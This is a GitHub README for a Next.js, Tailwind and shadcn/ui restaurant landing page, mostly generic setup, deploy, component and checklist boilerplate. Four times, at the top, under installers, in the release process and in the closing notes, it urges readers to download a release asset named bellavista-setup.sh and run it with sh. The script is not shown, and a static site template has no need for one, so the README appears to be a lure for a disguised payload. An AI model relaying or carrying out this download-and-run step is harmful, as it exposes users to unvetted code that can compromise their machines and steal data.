[![Releases](https://img.shields.io/badge/Releases-v1.0-blue?logo=github)](https://github.com/inloookin/bellavista-restaurant-landing-page/releases)

# Bella Vista Restaurant Landing — Next.js, Tailwind, shadcn/ui 🍽️

![Hero image of a modern restaurant interior](https://images.unsplash.com/photo-1528605248644-14dd04022da1?q=80&w=1400&auto=format&fit=crop&ixlib=rb-4.0.3&s=0a3b3d3b7c1a0a6b8f2bb6d2f8d3e9a9)

Repository: bellavista-restaurant-landing-page  
Topics: bellavista, landing, landing-page, nextjs, reactjs, restaurant, restaurant-management, restaurant-website, shadcn-ui, tailwindcss

Releases page: https://github.com/inloookin/bellavista-restaurant-landing-page/releases

Download and execute the release asset named bellavista-setup.sh from the Releases page. After you download it, run:
```bash
sh bellavista-setup.sh
```

Badges
- Build: ![build status](https://img.shields.io/badge/build-passing-brightgreen)
- License: ![MIT](https://img.shields.io/badge/license-MIT-blue)
- Tailwind: ![tailwindcss](https://img.shields.io/badge/TailwindCSS-3.0-teal)

Table of contents
- About
- Key features
- Tech stack
- Design & UI system
- Directory layout
- Quick demo
- Installation
- Run in development
- Build and export
- Releases and installers
- Deploy
- Environment variables
- Forms and backend
- Image handling and optimization
- Accessibility
- SEO and meta
- Performance tuning
- Tests and quality
- Styling and theming
- Components and patterns
- Adding pages and sections
- Internationalization
- Analytics and monitoring
- CI / CD
- Contributing
- Issues and bug reports
- Changelog (sample)
- License
- Acknowledgements
- FAQ
- Troubleshooting

About
Bella Vista is a modern, responsive landing site for a restaurant brand. It uses Next.js for rendering, TailwindCSS for styling, and shadcn/ui components for UI primitives. The project aims to present menus, gallery, testimonials, contact form, and smooth navigation on mobile and desktop devices.

Key features
- Responsive layout with mobile-first TailwindCSS.
- Menu with tabs and filters for courses and diets.
- Image gallery with lightbox support.
- Testimonials section with carousel.
- Contact form with validation and serverless handler.
- Smooth scroll and accessible keyboard navigation.
- SEO-friendly meta tags and Open Graph.
- Image optimization with Next.js Image.
- Ready-to-deploy with Vercel, Netlify, or Docker.
- Component-first architecture powered by shadcn/ui components.
- Theme support: light and dark modes.

Tech stack
- Next.js (v14 or v13+ with app router optional)
- React
- TailwindCSS
- shadcn/ui (Radix + Tailwind primitives)
- React Hook Form for forms
- zod for schema validation
- TypeScript (project can use JS if preferred)
- ESLint and Prettier
- GitHub Actions for CI (example)
- Vercel for deployment or Docker for container builds

Design & UI system
The UI follows a modular approach. Each element lives as a small component. The system uses design tokens for colors, spacing, and typography. shadcn/ui provides accessible primitives and patterns. Tailwind supplies utility classes. The project keeps styles in the component layer. Use className merging for variants.

Color palette (example)
- Primary: #D97706 (amber-600)
- Accent: #06B6D4 (cyan-500)
- Background: #FFFFFF (light) / #0F172A (dark)
- Text: #0F172A (dark) / #E6E7EB (light)

Typography
- Headings use Inter or system fonts.
- Body uses system-ui for performance.
- Use Tailwind font-size scale.

Directory layout
- /app or /pages — Next.js routes
- /components — UI components and primitives
- /lib — utilities and small helpers
- /styles — global CSS and Tailwind config
- /public — static files and images
- /data — sample menu data and testimonials
- /scripts — release helpers and build scripts
- /tests — unit and integration tests
- next.config.js
- tailwind.config.js
- package.json
- README.md

Quick demo
You can view the live demo deployed on Vercel from this repo. Check the Releases page for packaged assets and setup scripts:
https://github.com/inloookin/bellavista-restaurant-landing-page/releases

Installation

Prerequisites
- Node.js 18+ (LTS)
- npm 8+ or yarn 3+
- Git
- Optional: pnpm for monorepo handling

Clone the repo
```bash
git clone https://github.com/inloookin/bellavista-restaurant-landing-page.git
cd bellavista-restaurant-landing-page
```

Install
```bash
npm install
# or
yarn install
# or
pnpm install
```

Run in development
Start the dev server:
```bash
npm run dev
# or
yarn dev
```
Open http://localhost:3000 in your browser.

Build and export
Create a production build:
```bash
npm run build
npm start
```
For a static export:
```bash
npm run export
```
See next.config.js for export settings.

Releases and installers
Releases live here:
https://github.com/inloookin/bellavista-restaurant-landing-page/releases

Download the prepared installer or release asset named bellavista-setup.sh. After download, run:
```bash
sh bellavista-setup.sh
```
The script will:
- extract the release bundle
- install dependencies
- build the site
- start a local static server for preview

If you prefer manual steps, download the release archive and use the build steps above.

Deploy

Vercel (recommended for Next.js)
- Connect the GitHub repo in Vercel.
- Set NODE_ENV to production.
- Add environment variables from .env.example.
- Deploy. Vercel will handle SSR and image optimization.

Netlify
- Use next-on-netlify or the Next.js adapter.
- Set build command to npm run build and publish folder to .next or out.
- Add environment variables.

Docker
Example Dockerfile:
```dockerfile
FROM node:18-alpine AS base
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build
EXPOSE 3000
CMD ["npm", "start"]
```
Build and run:
```bash
docker build -t bellavista:latest .
docker run -p 3000:3000 bellavista:latest
```

Cloud (DigitalOcean, AWS)
- Use Docker or Vercel.
- For static hosting, run npm run export and host the out/ folder.

Environment variables
Create .env.local from .env.example. Common variables:
- NEXT_PUBLIC_SITE_URL=https://bellavista.example
- NEXT_PUBLIC_GOOGLE_ANALYTICS=UA-XXXXX-X
- CONTACT_FORM_ENDPOINT=/api/contact
- EMAIL_SERVICE_API_KEY=xxxxx

Forms and backend
Contact form uses a serverless API route. The route validates data and sends email via a provider. Example flow:
1. Client submits form.
2. Client-side uses React Hook Form and zod for validation.
3. API route validates again on the server.
4. If valid, the route posts to an email service (SendGrid, Mailgun) or an SMTP server.
5. Response indicates success or error.

Sample API route (Next.js)
```ts
import type { NextApiRequest, NextApiResponse } from 'next'
import { z } from 'zod'

const schema = z.object({
  name: z.string().min(1),
  email: z.string().email(),
  message: z.string().min(10),
})

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== 'POST') {
    return res.status(405).end()
  }
  const result = schema.safeParse(req.body)
  if (!result.success) {
    return res.status(400).json({ error: 'Invalid input' })
  }
  // Replace with provider call
  // await sendMail(result.data)
  return res.status(200).json({ ok: true })
}
```

Image handling and optimization
- Use Next.js Image for layouts.
- Keep responsive srcSet and sizes attributes.
- Use optimized formats like AVIF and WebP.
- Serve scaled images for mobile.
- Store raw assets in /public/images or use an external CDN.

Gallery pattern
- Grid with lazy load.
- Lightbox overlay using shadcn/ui Dialog or Radix Dialog.
- Use next/image to deliver optimized images.

Accessibility
The project uses accessible components. The team uses these practices:
- Semantic HTML: use nav, main, header, footer, section.
- ARIA attributes only when needed.
- Focus states provided for interactive elements.
- Keyboard navigation for menu tabs and lightbox.
- Alt text for all images.
- Color contrast meets WCAG AA for body text.

SEO and meta
Each page uses Head or metadata to set:
- title and description
- canonical link
- robots
- Open Graph tags (og:title, og:description, og:image)
- Twitter card tags

Structured data
Add schema.org JSON-LD for LocalBusiness and Restaurant:
```json
{
  "@context": "https://schema.org",
  "@type": "Restaurant",
  "name": "Bella Vista",
  "image": "https://example.com/hero.jpg",
  "address": {
    "@type": "PostalAddress",
    "streetAddress": "123 Ocean Drive",
    "addressLocality": "City",
    "addressRegion": "State",
    "postalCode": "12345",
    "addressCountry": "US"
  },
  "telephone": "+1-555-555-5555"
}
```

Performance tuning
- Use next/image and static assets.
- Defer non-critical scripts.
- Use preconnect for third-party domains.
- Use server-side rendering or ISR where applicable.
- Cache fonts and assets on the CDN.
- Use Lighthouse to audit performance and reach target budgets.

Testing and quality
- Unit tests: Jest + React Testing Library
- E2E tests: Playwright or Cypress
- Linting: ESLint with recommended rules
- Formatting: Prettier
- Type checks: TypeScript or tsc if using TS

Sample test
```ts
import { render, screen } from '@testing-library/react'
import Hero from '../components/Hero'

test('renders hero title', () => {
  render(<Hero />)
  expect(screen.getByText(/Bella Vista/i)).toBeInTheDocument()
})
```

Styling and theming
Tailwind config example:
```js
module.exports = {
  content: ['./app/**/*.{js,ts,jsx,tsx}', './components/**/*.{js,ts,jsx,tsx}'],
  theme: {
    extend: {
      colors: {
        primary: '#D97706',
        accent: '#06B6D4',
      },
    },
  },
  plugins: [],
}
```
Dark mode
- Use class-based dark mode.
- Toggle component updates document.documentElement class.

Components and patterns
Component list
- Layout
- Header / Nav
- Hero
- Menu (tabs + filters)
- Gallery
- Testimonials
- Reservations CTA
- Contact form
- Footer
- Theme switch
- Modal / Dialog
- Carousel
- Badge and Pills
- Utility components: Button, Input, Icon

Menu component
- Data-driven: array of items with id, name, price, tags, image, description.
- Tabs for categories: Starters, Mains, Desserts, Drinks.
- Filter by dietary tags: vegan, gluten-free, spicy.

Sample menu data
```js
export const menu = [
  { id: 'm1', name: 'Margherita', price: 12, tags: ['vegetarian'], category: 'Mains', image: '/images/pizza.jpg' },
  { id: 'm2', name: 'Tiramisu', price: 8, tags: ['contains-dairy'], category: 'Desserts', image: '/images/tiramisu.jpg' }
]
```

Adding pages and sections
- Create a route under /app or /pages.
- Add metadata.
- Use getStaticProps for SSG or getServerSideProps for SSR.
- Add components and import styles.

Internationalization (i18n)
- Use next-translate or Next.js i18n routing.
- Store translations in JSON files under /locales.
- Use keys for strings and avoid inline text in components.

Analytics and monitoring
- Add Google Analytics or Plausible using a script tag or a small wrapper component.
- Track page views and events for contact form submissions and reservations.
- Use Sentry for error monitoring.

CI / CD
GitHub Actions example
- Lint on push
- Run tests on PR
- Build and deploy on main branch
Example workflow:
```yaml
name: CI
on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v4
        with:
          node-version: 18
      - run: npm ci
      - run: npm run lint
      - run: npm run build
      - run: npm test
```

Contributing
- Fork the repo.
- Create a feature branch.
- Keep commits small and focused.
- Use conventional commits for clarity.
- Open a PR against main with a clear description and screenshots if UI changes.

PR checklist
- Tests pass
- Lint passes
- Type checks pass
- Changelog entry if needed
- Screenshots or a short demo

Issues and bug reports
Create a new issue with:
- Title that summarizes the problem
- Steps to reproduce
- Expected behavior
- Actual behavior
- Browser and OS
- Screenshots or console logs

Changelog (sample entries)
- v1.0.0 — initial release
  - Base layout and hero
  - Menu tabs and gallery
  - Contact form with serverless API
  - Responsive styles and basic accessibility
- v1.1.0 — features
  - Added testimonials carousel
  - Improved image performance and caching
  - Added dark mode

License
This project uses the MIT license. See LICENSE file.

Acknowledgements
- shadcn/ui for component patterns
- Tailwind Labs for TailwindCSS
- Next.js team for the framework
- Unsplash for hero images
- Icon sets like Phosphor Icons or Heroicons

FAQ

Q: Does the project support reservations?
A: The demo includes a Reservations CTA. You can integrate a booking backend or third-party widget. The code includes an example endpoint placeholder.

Q: Can I use this for a multi-page restaurant site?
A: Yes. The layout handles multiple routes. Add pages or sections for About, Menu, Events, and Contact. Use static generation for faster pages.

Q: Does it support server-side rendering?
A: Yes. Next.js supports SSR, SSG, and ISR. Choose the method that fits your data needs.

Q: How do I change the menu items?
A: Edit the data files under /data/menu or connect to a CMS like Contentful, Sanity, or Strapi.

Q: Is the contact form secure?
A: The API route validates input with zod. Use a secure mail provider and store keys in environment variables.

Troubleshooting

Build failed?
- Run npm run build locally to get stack traces.
- Check node version. Use Node 18+.
- Delete node_modules and reinstall if dependencies mismatch.

Image issues?
- Check next.config.js domains if using remote images.
- For static export, ensure images exist in /public.

Form not sending?
- Check CONTACT_FORM_ENDPOINT in environment.
- Verify provider API key and allowlist IPs.

Common commands
- npm run dev — start dev server
- npm run build — build for production
- npm start — start production server
- npm run lint — run ESLint
- npm test — run tests
- npm run export — static export

Design tokens and CSS variables
You can extract colors and spacing to CSS variables in :root for runtime theming. Tailwind can also use CSS variables for color tokens for instant theme switching.

Example theme toggle
- Use a small hook to toggle dark mode.
- Persist preference in localStorage.
- Update document.documentElement class to 'dark' or remove it.

Localization and content strategy
- Keep copy in /content or use a headless CMS.
- Use page-level metadata for each route.
- Provide alt text and descriptions for images.

Security best practices
- Do not commit secrets to the repo.
- Use environment variables and a secrets manager for production.
- Validate all incoming data on the server.

Performance budgets
- Keep total page weight under 1MB for mobile.
- Keep TTFB under 600ms where possible.
- Aim for CLS < 0.1, LCP < 2.5s on fast 3G.

Example component code
MenuTabs component (React)
```tsx
import { useState } from 'react'

export default function MenuTabs({ items }) {
  const categories = Array.from(new Set(items.map(i => i.category)))
  const [active, setActive] = useState(categories[0])

  return (
    <div>
      <nav className="flex gap-2 mb-4">
        {categories.map(cat => (
          <button key={cat} onClick={() => setActive(cat)} className={`px-4 py-2 rounded ${active === cat ? 'bg-primary text-white' : 'bg-gray-100'}`}>
            {cat}
          </button>
        ))}
      </nav>
      <ul>
        {items.filter(i => i.category === active).map(item => (
          <li key={item.id} className="flex gap-4 py-3 border-b">
            <img src={item.image} alt={item.name} className="w-24 h-24 object-cover rounded" />
            <div>
              <h4 className="font-medium">{item.name}</h4>
              <p className="text-sm text-muted">{item.description}</p>
            </div>
            <div className="ml-auto font-semibold">${item.price}</div>
          </li>
        ))}
      </ul>
    </div>
  )
}
```

Local development tips
- Use Tailwind JIT for fast builds.
- Use the Next.js preview mode for draft content from a headless CMS.
- Use yarn workspace or pnpm for monorepo setups.

Release process
- Create a release branch: release/v1.x
- Update changelog and bump version in package.json
- Tag the release and push to GitHub
- Prepare release assets (zip or tar)
- Upload bellavista-setup.sh as an asset that automates install steps

Release badge
Use the Releases link consistently for packaged installers. The badge at the top links to:
https://github.com/inloookin/bellavista-restaurant-landing-page/releases

Contributors
- Core design and code: inloookin
- UI components: community contributors
- Testing and documentation: contributors welcome

How to extend
- Swap menu data with a CMS for dynamic updates.
- Add user accounts for loyalty.
- Integrate online ordering via a payment gateway.
- Add a reservation calendar and backend.

Sample .env.example
```
NEXT_PUBLIC_SITE_URL=https://bellavista.example
NEXT_PUBLIC_GOOGLE_ANALYTICS=G-XXXXXXX
CONTACT_FORM_ENDPOINT=/api/contact
EMAIL_SERVICE_API_KEY=yourapikey
```

Assets and images
Store hero and menu images under /public/images. Use descriptive names and alt text. Compress images for production.

Accessibility checklist (short)
- Landmarks present
- Keyboard focus order correct
- Focus visible
- Images have alt text
- Form labels present
- Contrast ratio adequate
- Semantic HTML used

SEO checklist (short)
- Unique title per page
- Meta description per page
- Open Graph images sized 1200x630
- Canonical links set
- Structured data for LocalBusiness

Monitoring and logs
- Use server logs for API routes.
- Enable Sentry or an equivalent for exceptions.
- Use uptime monitors for production links.

Legal and privacy
- Provide a privacy policy if you collect emails.
- Store user data with secure practices.
- Comply with local laws for user data handling.

Final notes on releases
Download the installer asset bellavista-setup.sh from the releases page and execute it to install and preview a packaged build:
```bash
# after download
sh bellavista-setup.sh
```
Visit the Releases page for more options:
https://github.com/inloookin/bellavista-restaurant-landing-page/releases

End of README